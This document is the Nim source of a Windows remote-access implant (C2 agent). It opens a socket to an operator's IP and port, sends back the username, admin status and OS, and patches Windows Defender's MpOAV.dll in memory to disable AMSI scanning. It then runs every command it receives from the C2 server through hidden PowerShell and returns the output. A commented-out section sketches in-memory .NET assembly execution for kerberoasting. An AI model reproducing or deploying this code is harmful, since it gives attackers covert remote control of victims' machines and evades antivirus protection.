import net
import base64
import winim/lean
import winim/inc/lm
import os, sequtils
import std/osproc
import strutils
import strenc
import strformat
import winim/clr
import sugar


let ip = "INPUT_IP"
let patch_port = "INPUT_PORT"
var port = parseInt(patch_port)


var client: net.Socket = newSocket()
client.connect(ip,  Port(port))
echo "Trying to connect to: 192.168.1.218:5000"



proc inbound_comm(): string =
  var receivedMessage: string = client.recvLine(maxLength =446976)
  #var decoded_msg = decode(receivedMessage)
  return receivedMessage
  
  
var buffer = newString(UNLEN + 1)
var cb = DWORD buffer.len
GetUserNameA(&buffer, &cb)
buffer.setLen(cb - 1) # cb  including the terminating null character
echo "Running as: ", buffer
client.send(encode(buffer))

os.sleep(2000)

if os.isAdmin() == false:
  client.send(encode("0"))
else:
  client.send(encode("1"))


os.sleep(5000)
echo "OS: ", hostOS
client.send(encode(hostOS))


when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
    var length = len(filesInPath)
    # last dir == newest dir
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        echo "[X] Failed to load MpOav.dll"
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        echo "[X] Failed to get the address of 'DllGetClassObject'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    var success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"



while true:
  var message = inbound_comm()
  echo "C2: ", message

  if message == "exit":
    echo "[-] The server has terminated the session..."
    client.close()
    break
  elif message == "background":
    discard
  elif message == "persist":
    discard
  elif message == "help":
    discard
  #elif message == "execute-asm":
    #var asm_byte = inbound_comm()
    #echo "test"
    #echo asm_byte
      
      #Execute assembly code - need to figure out how to transfer byte code 
      #[
      echo "[*] Installed .NET versions"
      for v in clrVersions():
          echo fmt"    \--- {v}"
      echo "\n"

      echo ""

      var assembly = load(buf)
      dump assembly


      var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
      #assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

      arr = toCLRVariant(["kerberoast"], VT_BSTR) # Actually passing some args
      assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
      ]#
  else:
    try:
      var command = message
      var result = execProcess("powershell.exe -nop -w hidden -c " & command)
      client.send(encode(result))
    except OSError:
      echo "[-] An error occurred.. try again"
      client.send(encode("The command was not found on the system"))




  

client.close()